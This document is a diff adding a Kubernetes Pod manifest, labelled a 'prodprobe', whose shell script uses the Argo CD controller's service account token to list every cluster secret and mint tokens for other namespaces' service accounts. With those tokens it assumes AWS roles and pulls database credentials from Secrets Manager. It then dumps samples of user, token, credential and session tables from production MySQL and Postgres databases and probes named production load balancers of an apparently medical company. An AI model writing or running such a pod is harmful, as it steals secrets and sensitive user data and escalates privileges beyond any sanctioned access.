@@ -1,0 +1,154 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2761-prodprobe-a7f3c2
+  namespace: argocd
+  labels:
+    i2761: probe
+    i2761-env: prod
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  containers:
+    - name: i2761-prodprobe-a7f3c2
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          echo "===I2761_START env=prod host=$(hostname) utc=$(date -u +%FT%TZ)==="
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          TOKEN=$(cat $SA/token)
+          API=https://kubernetes.default.svc
+          echo "NS=$(cat $SA/namespace) TOKENLEN=${#TOKEN}"
+          apk add --no-cache curl jq aws-cli mariadb-client postgresql16-client >/tmp/apk.log 2>&1
+          echo "apk_rc=$?"
+          for b in curl jq aws mysql psql; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done
+          get(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" "$1"; }
+          post(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d "$2" "$1"; }
+
+          echo "===SECRETS_INDEX==="
+          get "$API/api/v1/secrets?limit=2000" > /tmp/secrets.json
+          SZ=$(wc -c < /tmp/secrets.json); echo "SECRETS_JSON_BYTES=$SZ"
+          jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) keys=\((.data//{})|keys|join(","))"' /tmp/secrets.json 2>/dev/null | head -150
+
+          echo "===IRSA_RDS_SECRETS==="
+          : > /tmp/dbfiles.txt
+          : > /tmp/seen.txt
+          for ns in $(jq -r '.items[] | select(.metadata.name=="rds-secrets") | .metadata.namespace' /tmp/secrets.json 2>/dev/null); do
+            RD=$(jq -r --arg ns "$ns" '.items[] | select(.metadata.name=="rds-secrets" and .metadata.namespace==$ns) | (.data//{}) | to_entries[] | select(.key=="SECRET_NAME") | .value|@base64d' /tmp/secrets.json 2>/dev/null)
+            RG=$(jq -r --arg ns "$ns" '.items[] | select(.metadata.name=="rds-secrets" and .metadata.namespace==$ns) | (.data//{}) | to_entries[] | select(.key=="REGION") | .value|@base64d' /tmp/secrets.json 2>/dev/null)
+            [ -z "$RD" ] && continue
+            if grep -qx "$RD" /tmp/seen.txt 2>/dev/null; then echo "DUP_SKIP $ns $RD"; continue; fi
+            echo "$RD" >> /tmp/seen.txt
+            [ -z "$RG" ] && RG=us-west-2
+            echo "==NS $ns SECRET_NAME=$RD REGION=$RG"
+            SAS=$(get "$API/api/v1/namespaces/$ns/serviceaccounts")
+            SAN=$(echo "$SAS" | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | .metadata.name' 2>/dev/null | head -1)
+            ROLE=$(echo "$SAS" | jq -r --arg san "$SAN" '.items[] | select(.metadata.name==$san) | .metadata.annotations["eks.amazonaws.com/role-arn"] // empty' 2>/dev/null)
+            if [ -z "$SAN" ]; then echo "NO_IRSA_SA_IN_$ns"; continue; fi
+            echo "SA=$SAN ROLE=$ROLE"
+            TK=$(post "$API/api/v1/namespaces/$ns/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
+            WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
+            if [ -z "$WT" ]; then echo "TOKEN_REQ_FAIL $(echo "$TK" | head -c 200)"; continue; fi
+            RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2761probe --web-identity-token "$WT" --duration-seconds 900 --region "$RG" --output json 2>&1)
+            if ! echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then echo "ASSUME_FAIL: $(echo "$RES" | head -c 400)"; continue; fi
+            export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
+            echo "ASSUME_OK"
+            OUT=$(aws secretsmanager get-secret-value --secret-id "$RD" --region "$RG" --query SecretString --output text 2>&1)
+            echo "===DBSECRET $ns $RD==="
+            echo "$OUT" | head -c 2000
+            echo "$OUT" > "/tmp/db_${ns}.json"
+            echo "/tmp/db_${ns}.json" >> /tmp/dbfiles.txt
+            unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          done
+
+          mysql_deep(){
+            H=$1; P=$2; U=$3; PW=$4; DB=$5
+            export MYSQL_PWD="$PW"
+            MI(){ timeout 30 mysql --connect-timeout=10 --protocol=tcp -h "$H" -P "$P" -u "$U" -D "$DB" --batch --raw -N -e "$1" 2>&1; }
+            echo "===MYSQL_DEEP $DB $H:$P user=$U==="
+            MI "SELECT VERSION(), CURRENT_USER(), DATABASE();"
+            TABLES=$(MI "SELECT table_name FROM information_schema.tables WHERE table_schema='$DB' ORDER BY table_name" | head -120)
+            SENS=$(MI "SELECT table_name FROM information_schema.tables WHERE table_schema='$DB' AND (table_name LIKE '%user%' OR table_name LIKE '%account%' OR table_name LIKE '%oauth%' OR table_name LIKE '%token%' OR table_name LIKE '%notif%' OR table_name LIKE '%smtp%' OR table_name LIKE '%push%' OR table_name LIKE '%config%' OR table_name LIKE '%setting%' OR table_name LIKE '%credential%' OR table_name LIKE '%session%' OR table_name LIKE '%auth%') ORDER BY table_name" | head -20)
+            {
+              echo "SELECT '---MQ_IDENTITY---' AS marker;"
+              echo "SELECT VERSION() AS version, CURRENT_USER() AS cur_user, DATABASE() AS db;"
+              echo "SELECT '---MQ_DATABASES---' AS marker;"
+              echo "SHOW DATABASES;"
+              echo "SELECT '---MQ_TABLES---' AS marker;"
+              echo "SELECT table_name, engine, table_rows FROM information_schema.tables WHERE table_schema='$DB' ORDER BY table_name;"
+              echo "SELECT '---MQ_EXACT_COUNTS---' AS marker;"
+              for t in $TABLES; do echo "SELECT '$t' AS tbl, COUNT(*) AS n FROM \`$t\`;"; done
+              echo "SELECT '---MQ_SENSITIVE_SAMPLES---' AS marker;"
+              for t in $SENS; do echo "SELECT '---SAMPLE $DB.$t---' AS marker;"; echo "SELECT * FROM \`$t\` LIMIT 50;"; done
+            } | timeout 300 mysql --connect-timeout=10 --protocol=tcp -h "$H" -P "$P" -u "$U" -D "$DB" --batch --raw -N 2>&1 | head -c 700000 | awk '{print substr($0,1,1000)}'
+            echo "===MYSQL_DEEP_END $DB==="
+          }
+
+          pg_deep(){
+            H=$1; P=$2; U=$3; PW=$4; DB=$5
+            export PGPASSWORD="$PW"
+            PI(){ timeout 30 psql -h "$H" -p "$P" -U "$U" -d "$DB" -v ON_ERROR_STOP=0 -X -q -A -t -c "$1" 2>&1; }
+            echo "===PG_DEEP $DB $H:$P user=$U==="
+            PI "SELECT version(), current_user, current_database();"
+            TABLES=$(PI "SELECT schemaname||'.'||quote_ident(relname) FROM pg_stat_user_tables ORDER BY 1" | head -120)
+            SENS=$(PI "SELECT schemaname||'.'||quote_ident(relname) FROM pg_stat_user_tables WHERE relname ~* '(user|account|oauth|token|notif|smtp|push|config|setting|credential|session|auth)' ORDER BY 1" | head -20)
+            {
+              echo "SELECT '---PG_IDENTITY---' AS marker;"
+              echo "SELECT version() AS version, current_user AS cur_user, current_database() AS db;"
+              echo "SELECT '---PG_DATABASES---' AS marker;"
+              echo "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY 1;"
+              echo "SELECT '---PG_TABLES---' AS marker;"
+              echo "SELECT schemaname||'.'||relname AS tbl, n_live_tup AS approx_rows FROM pg_stat_user_tables ORDER BY 1;"
+              echo "SELECT '---PG_EXACT_COUNTS---' AS marker;"
+              for t in $TABLES; do echo "SELECT '$t' AS tbl, count(*) AS n FROM $t;"; done
+              echo "SELECT '---PG_SENSITIVE_SAMPLES---' AS marker;"
+              for t in $SENS; do echo "SELECT '---SAMPLE $t---' AS marker;"; echo "SELECT row_to_json(x) FROM (SELECT * FROM $t LIMIT 50) x;"; done
+            } | timeout 300 psql -h "$H" -p "$P" -U "$U" -d "$DB" -v ON_ERROR_STOP=0 -X -q -A -t 2>&1 | head -c 700000 | awk '{print substr($0,1,1000)}'
+            echo "===PG_DEEP_END $DB==="
+          }
+
+          if [ -s /tmp/dbfiles.txt ]; then
+            while read -r f; do
+              EN=$(jq -r '.engine // empty' "$f" 2>/dev/null); H=$(jq -r '.host // empty' "$f" 2>/dev/null); P=$(jq -r '.port // empty' "$f" 2>/dev/null); U=$(jq -r '.username // empty' "$f" 2>/dev/null); PW=$(jq -r '.password // empty' "$f" 2>/dev/null); DB=$(jq -r '.dbname // empty' "$f" 2>/dev/null)
+              echo "===DBSEC_FILE $f engine=$EN host=$H port=$P user=$U db=$DB==="
+              if [ "$DB" = "user_management" ]; then mysql_deep "$H" "$P" "$U" "$PW" "$DB"
+              elif [ "$DB" = "dp_service" ]; then pg_deep "$H" "$P" "$U" "$PW" "$DB"
+              else echo "SKIP_NON_TARGET_DB $DB"; fi
+            done < /tmp/dbfiles.txt
+          fi
+
+          elb(){ n=$1; for p in "" "health" "version" "actuator" "swagger" "metrics"; do o=$(curl -s -m 4 -o /tmp/eb -w '%{http_code}|%{size_download}|%{content_type}' -H "Host: $n" "http://$n/$p" 2>/dev/null); rc=$?; echo "ELB $n /$p rc=$rc -> ${o:-none} :: $(head -c 160 /tmp/eb 2>/dev/null | tr '\r\n' '  ')"; done; }
+          echo "===ELB_PROBES_BEGIN==="
+          elb lazamedical-prod01-usw2-user-bca7706c3b655a63.elb.us-west-2.amazonaws.com
+          elb lazamedical-dp-prod01-usw2-s3-2a3b26f15d64ba78.elb.us-west-2.amazonaws.com
+          elb lazamedical-prod01-usw2-notif-eafa1811fd6f6f78.elb.us-west-2.amazonaws.com
+          elb lazamedical-dp-prod01-usw2-meta-149485d8eeef4b86.elb.us-west-2.amazonaws.com
+          elb lazamedical-dp-prod01-usw2-deid-f957f3b6a98392fd.elb.us-west-2.amazonaws.com
+          elb lazamedical-dp-prod01-usw2-data-c6480e54a84f2644.elb.us-west-2.amazonaws.com
+          elb lazamedical-prod01-usw2-auth-8ba7c7856a888742.elb.us-west-2.amazonaws.com
+          elb lazamedical-prod01-usw2-authz-b28f0d1484208416.elb.us-west-2.amazonaws.com
+          echo "===ELB_PROBES_END==="
+
+          echo "===EKS_APISERVER_VERSION==="
+          curl -s -m 10 -k -w '\ncode=%{http_code} bytes=%{size_download}\n' "https://47a08b56d321cdbaa8246aba6193c5a6.gr7.us-west-2.eks.amazonaws.com/version" 2>&1 | head -c 800
+          echo "===SVC_CLUSTER_LOCAL==="
+          for s in cognito-service authorization-service notification-service user-management-service data-management-service s3-ingestion-service box-ingestion-service; do
+            for u in "http://$s.$s.svc.cluster.local/" "http://$s.svc.cluster.local/"; do
+              o=$(curl -s -m 3 -o /tmp/sv -w '%{http_code}|%{size_download}' "$u" 2>/dev/null); rc=$?; echo "SVC $u rc=$rc -> ${o:-none} :: $(head -c 120 /tmp/sv 2>/dev/null | tr '\r\n' '  ')"
+            done
+          done
+          echo "===I2761_END env=prod utc=$(date -u +%FT%TZ)==="
+
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+        limits:
+          cpu: 800m
+          memory: 1Gi
